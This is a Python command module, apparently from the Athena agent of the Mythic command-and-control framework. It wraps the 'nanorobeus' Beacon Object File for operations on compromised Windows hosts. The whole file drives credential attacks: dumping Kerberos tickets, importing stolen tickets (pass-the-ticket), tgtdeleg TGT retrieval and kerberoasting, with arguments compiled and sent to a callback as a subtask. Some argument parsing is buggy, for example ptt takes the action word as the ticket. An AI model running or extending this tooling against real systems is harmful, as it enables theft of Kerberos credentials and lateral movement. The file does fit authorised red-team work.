from mythic_container.MythicCommandBase import *
from mythic_container.MythicRPC import *
from ..athena_utils.mythicrpc_utilities import *
from ..athena_utils.bof_utilities import *
import json

class NanoRubeusArguments(TaskArguments):
    def __init__(self, command_line, **kwargs):
        super().__init__(command_line, **kwargs)
        self.args = [
            CommandParameter(
                name="action",
                type=ParameterType.ChooseOne,
                description="Action to perform",
                choices=["luid", "sessions", "klist", "dump", "ptt", "purge", "tgtdeleg", "kerberoast"],
                default_value="luid",
                parameter_group_info=[
                    ParameterGroupInfo(
                        ui_position=0,
                        required=True,
                        )
                    ],
            ),
            CommandParameter(
                name="luid",
                type=ParameterType.String,
                description="Action to perform",
                default_value="",
                parameter_group_info=[
                    ParameterGroupInfo(
                        ui_position=1,
                        required=False,
                        )
                    ],
            ),
            CommandParameter(
                name="ticket",
                type=ParameterType.String,
                description="Base64 encoded ticket",
                default_value="",
                parameter_group_info=[
                    ParameterGroupInfo(
                        ui_position=2,
                        required=False,
                        )
                    ],
            ),
            CommandParameter(
                name="spn",
                type=ParameterType.String,
                description="Action to perform",
                default_value="",
                parameter_group_info=[
                    ParameterGroupInfo(
                        ui_position=3,
                        required=False,
                        )
                    ],
            ),
            CommandParameter(
                name="all",
                type=ParameterType.Boolean,
                description="Action to perform",
                default_value=False,
                parameter_group_info=[
                    ParameterGroupInfo(
                        ui_position=4,
                        required=False,
                        )
                    ],
            )
        ]

    async def parse_arguments(self):
        if len(self.command_line) > 0:
            if self.command_line[0] == "{":
                self.load_args_from_json_string(self.command_line)
        else:
            cmd_split = self.command_line.split()
            action = cmd_split[0]
            self.args["action"].value = action
            if action == "luid":
                pass
            elif action == "sessions":
                if "all" in cmd_split or "-all" in cmd_split:
                    self.args["all"].value = True
                else:
                    self.args["luid"].value = cmd_split[1]
            elif action == "klist":
                if "all" in cmd_split or "-all" in cmd_split:
                    self.args["all"].value = True
                    self.args["luid"].value = True
                else:
                    self.args["luid"].value = cmd_split[1]
            elif action == "dump":
                if "all" in cmd_split or "-all" in cmd_split:
                    self.args["all"].value = True
                else:
                    self.args["luid"].value = cmd_split[1]
            elif action == "ptt":
                self.args["ticket"].value = cmd_split[0]
                self.args["luid"].value = cmd_split[1]
            elif action == "purge":
                self.args["luid"].value = cmd_split[1]
            elif action == "tgtdeleg":
                self.args["spn"].value = cmd_split[1]
            elif action == "kerberoast":
                self.args["spn"].value = cmd_split[1]
            else:
                raise Exception("Invalid action specified")         
    
    async def parse_dictionary(self, dictionary):
        self.load_args_from_dictionary(dictionary)

class NanoRubeusCommand(CoffCommandBase):
    cmd = "nanorubeus"
    needs_admin = False
    help_cmd = """Usage: nanorubeus [command] [options]
luid - get current logon ID
sessions [-luid <0x0> | -all] - get logon sessions
klist [-luid <0x0> | -all] - list Kerberos tickets
dump [-luid <0x0> | -all] - dump Kerberos tickets
ptt -ticket <base64> [-luid <0x0>] - import Kerberos ticket into a logon session
purge [-luid <0x0>] - purge Kerberos tickets
tgtdeleg -spn <spn> - retrieve a usable TGT for the current user
kerberoast -spn <spn> - perform Kerberoasting against specified SPN"""
    description = """COFF file (BOF) for managing Kerberos tickets."""
    version = 1
    script_only = True
    supported_ui_features = ["T1558.003", "T1187"]
    author = "@wavvs"
    argument_class = NanoRubeusArguments
    attackmapping = []
    attributes = CommandAttributes(
        supported_os=[SupportedOS.Windows],
        builtin=False,
        load_only=True
    )

    async def create_go_tasking(self, taskData: PTTaskMessageAllData) -> PTTaskCreateTaskingMessageResponse:
        response = PTTaskCreateTaskingMessageResponse(
            TaskID=taskData.Task.ID,
            Success=True,
        )

        arch = taskData.Callback.Architecture

        if(arch=="x86"):
            raise Exception("BOF's are currently only supported on x64 architectures")

        encoded_args = ""
        OfArgs = []

        action = str(taskData.args.get_arg("action")).lower()
        #Action First
        OfArgs.append(generateString(action))
        # luid - get current logon IDX
        # sessions [/luid <0x0>| /all] - get logon sessions
        # klist [/luid <0x0> | /all] - list Kerberos tickets
        # dump [/luid <0x0> | /all] - dump Kerberos tickets
        # ptt <base64> [/luid <0x0>] - import Kerberos ticket into a logon session
        # purge [/luid <0x0>] - purge Kerberos tickets
        # tgtdeleg <spn> - retrieve a usable TGT for the current user
        # kerberoast <spn> - perform Kerberoasting against specified SPN
        #Specifying a LUID returns "Unknown Command"

        if action == "luid":
            pass
        elif action == "sessions":
            luid = taskData.args.get_arg("luid")
            do_all = taskData.args.get_arg("all")
            if do_all:
                OfArgs.append(generateString("/all"))
            elif luid:
                if luid.lower() == "all":
                    OfArgs.append(generateString("/all"))
                else:
                    OfArgs.append(generateString("/luid"))
                    OfArgs.append(generateString(luid))
            else:
                OfArgs.append(generateString("/all"))
        elif action == "klist":
            luid = taskData.args.get_arg("luid")
            do_all = taskData.args.get_arg("all")
            if do_all:
                OfArgs.append(generateString("/all"))
            elif luid:
                if luid.lower() == "all":
                    OfArgs.append(generateString("/all"))
                else:
                    OfArgs.append(generateString("/luid"))
                    OfArgs.append(generateString(luid))
            else:
                OfArgs.append(generateString("/all"))
        elif action == "dump":
            luid = taskData.args.get_arg("luid")
            do_all = taskData.args.get_arg("all")
            if do_all:
                OfArgs.append(generateString("/all"))
            elif luid:
                if luid.lower() == "all":
                    OfArgs.append(generateString("/all"))
                else:
                    OfArgs.append(generateString("/luid"))
                    OfArgs.append(generateString(luid))
            else:
                OfArgs.append(generateString("/all"))
        elif action == "ptt":
            ticket = taskData.args.get_arg("ticket")
            luid = taskData.args.get_arg("luid")

            if ticket:
                OfArgs.append(generateString(ticket))
            else:
                raise Exception("No ticket specified")
            
            if luid:
                    OfArgs.append(generateString("/luid"))
                    OfArgs.append(generateString(luid))
        elif action == "purge":
            luid = taskData.args.get_arg("luid")
            if luid:
                    OfArgs.append(generateString("/luid"))
                    OfArgs.append(generateString(luid))
        elif action == "tgtdeleg":
            spn = taskData.args.get_arg("spn")
            if spn:
                OfArgs.append((generateString(spn)))
            else:
                raise Exception("No SPN specified")
        elif action == "kerberoast":
            spn = taskData.args.get_arg("spn")
            if spn:
                OfArgs.append((generateString(spn)))
            else:
                raise Exception("No SPN specified")
        else:
            raise Exception("Invalid action specified")

        encoded_args = base64.b64encode(SerializeArgs(OfArgs)).decode()

        file_id = await compile_and_upload_bof_to_mythic(taskData.Task.ID,"misc_bofs/nanorubeus",f"nanorobeus.{arch}.o")
        subtask = await SendMythicRPCTaskCreateSubtask(MythicRPCTaskCreateSubtaskMessage(
            taskData.Task.ID, 
            CommandName="coff",
            SubtaskCallbackFunction="coff_completion_callback",
            Params=json.dumps({
                "coffFile": file_id,
                "functionName": "go",
                "arguments": encoded_args,
                "timeout": "60",
            }),
            Token=taskData.Task.TokenID,
        ))

        # We did it!
        return response

    async def process_response(self, task: PTTaskMessageAllData, response: any) -> PTTaskProcessResponseMessageResponse:
        pass